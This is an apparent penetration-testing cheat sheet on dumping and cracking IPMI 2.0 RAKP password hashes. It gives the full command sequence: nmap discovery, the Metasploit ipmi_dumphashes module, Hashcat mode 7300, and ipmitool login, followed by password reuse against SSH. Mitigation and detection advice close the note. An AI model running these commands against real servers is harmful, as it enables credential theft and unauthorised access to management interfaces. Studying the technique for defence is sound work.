---
topic: Hash RAKP de IPMI 2.0
tags: [linux, ipmi, rakp, hashcat, credentials]
---

# Hash RAKP de IPMI 2.0

**English** | [🇪🇸 Español](ipmi-rakp-hash.md)

## Concept

IPMI 2.0 with RAKP authentication sends an HMAC-SHA1 hash derived from the user's password. An attacker can request the hash without authenticating and crack it offline.

## When it applies

- UDP/623 reachable.
- IPMI 2.0 with valid users.
- Weak or reused passwords.

## Procedure

1. Confirm IPMI with `nmap -sU -p623`.
2. Run the RAKP hash scanner.
3. Crack the hash with Hashcat mode 7300.
4. Test the password against SSH, web or IPMI itself.

```bash
nmap -sU -p623 <IP>
msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS <IP>; run'
hashcat -m 7300 ipmi.hash /usr/share/wordlists/rockyou.txt
ipmitool -I lanplus -H <IP> -U <USER> -P '<PASS>' chassis status
```

## Variants

- IPMI 1.5 without RAKP.
- Default users or SNMP community strings.
- Hash captured with `ipmi_dumphashes` and cracked with John.
- Password reuse in Zabbix or SSH.

## Limitations

- IPMI must be exposed and allow RAKP.
- Strong passwords resist cracking.
- Some BMCs rate-limit attempts.

## Mitigation and detection

- Isolate IPMI on a management network and disable RAKP when possible.
- Use long, unique passwords; rotate them.
- Monitor RAKP queries and anomalous UDP/623 access.

## References

- <https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/ipmi/ipmi_dumphashes.rb>
- <https://hashcat.net/wiki/doku.php?id=example_hashes>
- <https://www.dmtf.org/standards/ipmi>
